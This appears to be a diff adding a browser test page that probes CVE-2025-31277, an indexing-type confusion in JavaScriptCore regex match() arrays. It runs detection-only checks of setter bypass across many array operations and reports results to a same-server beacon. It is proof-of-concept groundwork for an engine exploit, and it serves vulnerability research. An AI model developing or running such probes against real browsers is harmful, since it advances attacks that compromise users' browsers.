@@ -1,0 +1,508 @@
+<!--
+  p639: CVE-2025-31277 — CORRECT hole-write discriminator + array ops
+
+  CRASH_CLASS: LOW (detection only)
+
+  p637/p638 used getter bypass as evidence, but own properties shadow
+  prototype getters regardless of indexing type. The TRUE discriminator
+  for Contiguous vs SlowPut is: write to a HOLE within vectorLength.
+
+  - Contiguous: write goes directly to butterfly (setter NOT called)
+  - SlowPut: write goes through slow path (setter IS called)
+
+  Also tests: push/pop/splice/reverse/sort/from/slice/concat behavior,
+  and whether confused arrays can be used to violate JSC invariants.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p639</title></head>
+<body>p639: HABT hole-write discriminator + array ops
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 4) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var batch = bQ.splice(0, 10);
+  for (var i = 0; i < batch.length; i++) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', '/beacon/P639-' + encodeURIComponent(batch[i]), false);
+      x.send();
+    } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,200)); flush(); };
+
+emit('START', 'v1');
+flush();
+
+// ================================================================
+// SECTION A: THE CORRECT DISCRIMINATOR — write to hole
+// ================================================================
+try {
+  var sCalls = 0;
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP_GET'; },
+    set: function(v) { sCalls++; }
+  });
+
+  // Test 1: Normal array (should be SlowPut in HABT)
+  var normArr = ['x', 'y'];
+  delete normArr[0]; // create hole at [0]
+
+  sCalls = 0;
+  normArr[0] = 'written'; // write to hole
+  var normVal = normArr[0]; // read back
+  emit('A-NORM', 'sCalls=' + sCalls + ' val=' + normVal +
+       ' hasOwn=' + normArr.hasOwnProperty(0));
+
+  // Test 2: Confused match array (Contiguous?)
+  var confArr = "abcabc".match(/a/g); // ['a', 'a']
+  delete confArr[0]; // create hole at [0]
+
+  sCalls = 0;
+  confArr[0] = 'written'; // write to hole — THE KEY TEST
+  var confVal = confArr[0]; // read back
+  emit('A-CONF', 'sCalls=' + sCalls + ' val=' + confVal +
+       ' hasOwn=' + confArr.hasOwnProperty(0));
+
+  // DISCRIMINATOR:
+  // If confArr is SlowPut: sCalls=1, val='AP_GET' (setter swallowed, getter returns)
+  // If confArr is Contiguous: sCalls=0, val='written' (direct butterfly write)
+  if (sCalls === 0 && confVal === 'written') {
+    emit('A-VULN', '*** CONFIRMED: Contiguous — hole write bypassed setter ***');
+  } else if (sCalls > 0) {
+    emit('A-SAFE', 'setter fired — SlowPut (patched or HABT active)');
+  } else {
+    emit('A-MIXED', 'sCalls=' + sCalls + ' val=' + confVal);
+  }
+
+  // Test 3: Normal array created with literal AFTER HABT
+  var litArr = ['p', 'q'];
+  delete litArr[0];
+  sCalls = 0;
+  litArr[0] = 'lit_write';
+  var litVal = litArr[0];
+  emit('A-LIT', 'sCalls=' + sCalls + ' val=' + litVal);
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('A-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION B: Write to NEW index (beyond length, within vector?)
+// match result vectorLength might equal length, so push tests capacity
+// ================================================================
+try {
+  var bsCalls = 0;
+  Object.defineProperty(Array.prototype, 2, {
+    configurable: true,
+    get: function() { return 'AP2_GET'; },
+    set: function(v) { bsCalls++; }
+  });
+
+  // Confused array: ['a', 'a'] — index 2 doesn't exist
+  var bArr = "abcabc".match(/a/g);
+  emit('B-PRE', 'len=' + bArr.length + ' [2]=' + bArr[2]);
+
+  bsCalls = 0;
+  bArr[2] = 'new_elem'; // write to index 2 (new, beyond length)
+  var bVal = bArr[2];
+  emit('B-WRITE', 'sCalls=' + bsCalls + ' val=' + bVal +
+       ' len=' + bArr.length + ' hasOwn=' + bArr.hasOwnProperty(2));
+
+  if (bsCalls === 0 && bVal === 'new_elem') {
+    emit('B-VULN', '*** Beyond-length write bypassed setter ***');
+  } else if (bsCalls > 0) {
+    emit('B-SAFE', 'setter fired for beyond-length write');
+  }
+
+  delete Array.prototype[2];
+} catch(e) {
+  emit('B-ERR', e.message);
+  try { delete Array.prototype[2]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION C: push() on confused array — does it bypass?
+// ================================================================
+try {
+  var csCalls = 0;
+  // Use a high index so push won't conflict
+  var pushIdx;
+
+  var cArr = "xyzxyz".match(/x/g); // ['x', 'x']
+  pushIdx = cArr.length; // 2
+  Object.defineProperty(Array.prototype, pushIdx, {
+    configurable: true,
+    get: function() { return 'AP_PUSH_GET'; },
+    set: function(v) { csCalls++; }
+  });
+
+  csCalls = 0;
+  cArr.push('pushed');
+  var pushVal = cArr[pushIdx];
+  emit('C-PUSH', 'sCalls=' + csCalls + ' val=' + pushVal + ' len=' + cArr.length);
+
+  if (csCalls === 0 && pushVal === 'pushed') {
+    emit('C-VULN', '*** push() bypassed setter — fast path on Contiguous ***');
+  } else if (csCalls > 0) {
+    emit('C-SAFE', 'setter fired on push — slow path');
+  }
+
+  delete Array.prototype[pushIdx];
+} catch(e) {
+  emit('C-ERR', e.message);
+  try { delete Array.prototype[pushIdx]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION D: splice() on confused array
+// splice can insert elements — do they bypass setters?
+// ================================================================
+try {
+  Object.defineProperty(Array.prototype, 1, {
+    configurable: true,
+    get: function() { return 'AP1_GET'; },
+    set: function(v) { sCalls++; }
+  });
+  sCalls = 0;
+
+  var dArr = "abab".match(/a/g); // ['a', 'a']
+  dArr.splice(1, 0, 'inserted'); // insert at index 1, shifting existing [1] to [2]
+  emit('D-SPLICE', 'sCalls=' + sCalls + ' len=' + dArr.length +
+       ' [0]=' + dArr[0] + ' [1]=' + dArr[1] + ' [2]=' + dArr[2]);
+
+  delete Array.prototype[1];
+} catch(e) {
+  emit('D-ERR', e.message);
+  try { delete Array.prototype[1]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION E: Array.from / slice / concat — do results inherit confusion?
+// ================================================================
+try {
+  var esCalls = 0;
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP0_GET'; },
+    set: function(v) { esCalls++; }
+  });
+
+  var eArr = "xyxy".match(/x/g); // ['x', 'x'] — confused
+
+  // Array.from
+  esCalls = 0;
+  var fromArr = Array.from(eArr);
+  delete fromArr[0];
+  esCalls = 0;
+  fromArr[0] = 'from_write';
+  var fromVal = fromArr[0];
+  emit('E-FROM', 'sCalls=' + esCalls + ' val=' + fromVal);
+
+  // slice
+  esCalls = 0;
+  var sliceArr = eArr.slice();
+  delete sliceArr[0];
+  esCalls = 0;
+  sliceArr[0] = 'slice_write';
+  var sliceVal = sliceArr[0];
+  emit('E-SLICE', 'sCalls=' + esCalls + ' val=' + sliceVal);
+
+  // concat
+  esCalls = 0;
+  var concatArr = eArr.concat(['z']);
+  delete concatArr[0];
+  esCalls = 0;
+  concatArr[0] = 'concat_write';
+  var concatVal = concatArr[0];
+  emit('E-CONCAT', 'sCalls=' + esCalls + ' val=' + concatVal);
+
+  // spread
+  esCalls = 0;
+  var spreadArr = [...eArr];
+  delete spreadArr[0];
+  esCalls = 0;
+  spreadArr[0] = 'spread_write';
+  var spreadVal = spreadArr[0];
+  emit('E-SPREAD', 'sCalls=' + esCalls + ' val=' + spreadVal);
+
+  // map
+  esCalls = 0;
+  var mapArr = eArr.map(function(x) { return x; });
+  delete mapArr[0];
+  esCalls = 0;
+  mapArr[0] = 'map_write';
+  var mapVal = mapArr[0];
+  emit('E-MAP', 'sCalls=' + esCalls + ' val=' + mapVal);
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('E-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION F: sort() on confused array — fast or slow path?
+// ================================================================
+try {
+  var fsCalls = 0;
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP0_SORT'; },
+    set: function(v) { fsCalls++; }
+  });
+
+  var fArr = "dcba".match(/./g); // ['d', 'c', 'b', 'a']
+  fsCalls = 0;
+  fArr.sort();
+  emit('F-SORT', 'sCalls=' + fsCalls + ' [0]=' + fArr[0] + ' [1]=' + fArr[1] +
+       ' [2]=' + fArr[2] + ' [3]=' + fArr[3] + ' len=' + fArr.length);
+
+  // If sort used fast path: sCalls=0, sorted correctly
+  // If sort used slow path: sCalls>0 (setter intercepts writes during sort)
+  if (fsCalls === 0) {
+    emit('F-FAST', 'sort used fast Contiguous path — setter bypassed');
+  } else {
+    emit('F-SLOW', 'sort used slow path — setter called ' + fsCalls + ' times');
+  }
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('F-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION G: reverse() on confused array
+// ================================================================
+try {
+  var gsCalls = 0;
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP0_REV'; },
+    set: function(v) { gsCalls++; }
+  });
+
+  var gArr = "abcd".match(/./g); // ['a', 'b', 'c', 'd']
+  gsCalls = 0;
+  gArr.reverse();
+  emit('G-REV', 'sCalls=' + gsCalls + ' [0]=' + gArr[0] + ' [1]=' + gArr[1] +
+       ' [2]=' + gArr[2] + ' [3]=' + gArr[3]);
+
+  if (gsCalls === 0) {
+    emit('G-FAST', 'reverse used fast path — setter bypassed');
+  } else {
+    emit('G-SLOW', 'reverse used slow path — setter called ' + gsCalls + ' times');
+  }
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('G-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION H: Species override — does map/filter use custom constructor?
+// If Array[Symbol.species] returns a TypedArray, map might create one
+// with the confused array's elements interpreted as raw bytes.
+// ================================================================
+try {
+  // Save original species
+  var origSpecies = Array[Symbol.species];
+
+  // Override species to return a regular Array (baseline)
+  Object.defineProperty(Array, Symbol.species, {
+    configurable: true,
+    get: function() { return Array; }
+  });
+
+  var hArr = "abab".match(/a/g); // ['a', 'a']
+  var hMapped = hArr.map(function(x) { return x + '!'; });
+  emit('H-SPECIES', 'type=' + typeof hMapped + ' isArr=' + Array.isArray(hMapped) +
+       ' len=' + hMapped.length + ' [0]=' + hMapped[0]);
+
+  // Try species returning a different constructor
+  function CustomArr() { this.length = 0; }
+  CustomArr.prototype = Object.create(Array.prototype);
+  Object.defineProperty(Array, Symbol.species, {
+    configurable: true,
+    get: function() { return CustomArr; }
+  });
+
+  var hMapped2 = hArr.map(function(x) { return x + '?'; });
+  emit('H-CUSTOM', 'type=' + typeof hMapped2 +
+       ' isCustom=' + (hMapped2 instanceof CustomArr) +
+       ' len=' + hMapped2.length);
+
+  // Restore
+  if (origSpecies !== undefined) {
+    Object.defineProperty(Array, Symbol.species, {
+      configurable: true, get: function() { return origSpecies; }
+    });
+  } else {
+    delete Array[Symbol.species];
+  }
+} catch(e) {
+  emit('H-ERR', e.message);
+}
+flush();
+
+// ================================================================
+// SECTION I: pop() on confused array
+// ================================================================
+try {
+  var isCalls = 0;
+  var iPoppedIdx;
+
+  var iArr = "xyxy".match(/./g); // ['x', 'y', 'x', 'y']
+  iPoppedIdx = iArr.length - 1; // 3
+  Object.defineProperty(Array.prototype, iPoppedIdx, {
+    configurable: true,
+    get: function() { return 'AP_POP'; },
+    set: function(v) { isCalls++; }
+  });
+
+  isCalls = 0;
+  var popped = iArr.pop();
+  emit('I-POP', 'sCalls=' + isCalls + ' popped=' + popped +
+       ' len=' + iArr.length);
+
+  // Now the slot is empty (hole). Push something back:
+  isCalls = 0;
+  iArr.push('repush');
+  var repushVal = iArr[iPoppedIdx];
+  emit('I-REPUSH', 'sCalls=' + isCalls + ' val=' + repushVal);
+
+  delete Array.prototype[iPoppedIdx];
+} catch(e) {
+  emit('I-ERR', e.message);
+  try { delete Array.prototype[iPoppedIdx]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION J: unshift() on confused array — inserts at beginning
+// ================================================================
+try {
+  var jsCalls = 0;
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP0_UNSHIFT'; },
+    set: function(v) { jsCalls++; }
+  });
+
+  var jArr = "ab".match(/./g); // ['a', 'b']
+  jsCalls = 0;
+  jArr.unshift('z');
+  emit('J-UNSHIFT', 'sCalls=' + jsCalls + ' len=' + jArr.length +
+       ' [0]=' + jArr[0] + ' [1]=' + jArr[1] + ' [2]=' + jArr[2]);
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('J-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION K: Interaction test — confused array as constructor arg
+// new Set(), new Map(), JSON ops
+// ================================================================
+try {
+  var kArr = "abcabc".match(/./g); // ['a','b','c','a','b','c']
+
+  // Set — iterates and stores unique values
+  var kSet = new Set(kArr);
+  emit('K-SET', 'size=' + kSet.size + ' has_a=' + kSet.has('a'));
+
+  // JSON round-trip
+  var kJson = JSON.stringify(kArr);
+  var kParsed = JSON.parse(kJson);
+  emit('K-JSON', 'str=' + kJson.slice(0, 50) + ' len=' + kParsed.length);
+
+  // structuredClone
+  var kClone = structuredClone(kArr);
+  emit('K-CLONE', 'len=' + kClone.length + ' [0]=' + kClone[0] +
+       ' isArr=' + Array.isArray(kClone));
+
+  // Test if clone is also confused
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP0_CLONE'; },
+    set: function(v) { sCalls++; }
+  });
+  sCalls = 0;
+  delete kClone[0];
+  kClone[0] = 'clone_hole_write';
+  var cloneVal = kClone[0];
+  emit('K-CLONE-HOLE', 'sCalls=' + sCalls + ' val=' + cloneVal);
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('K-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+// ================================================================
+// SECTION L: Multiple match() calls — are ALL confused?
+// And: does the confusion persist across GC?
+// ================================================================
+try {
+  Object.defineProperty(Array.prototype, 0, {
+    configurable: true,
+    get: function() { return 'AP0_L'; },
+    set: function(v) { sCalls++; }
+  });
+
+  var results = [];
+  for (var i = 0; i < 5; i++) {
+    var mArr = ("test" + i + "test").match(/t/g);
+    delete mArr[0];
+    sCalls = 0;
+    mArr[0] = 'hole_write_' + i;
+    results.push(sCalls + ':' + mArr[0]);
+  }
+  emit('L-MULTI', results.join(' '));
+
+  // Force GC via allocation pressure
+  var garbage = [];
+  for (var i = 0; i < 100000; i++) {
+    garbage.push({x: i});
+  }
+  garbage = null;
+
+  // Test after GC
+  var postGcArr = "postGC".match(/o/g);
+  delete postGcArr[0];
+  sCalls = 0;
+  postGcArr[0] = 'post_gc_write';
+  emit('L-POSTGC', 'sCalls=' + sCalls + ' val=' + postGcArr[0]);
+
+  delete Array.prototype[0];
+} catch(e) {
+  emit('L-ERR', e.message);
+  try { delete Array.prototype[0]; } catch(e2) {}
+}
+flush();
+
+emit('DONE', 'v1');
+flush();
+</script></body></html>
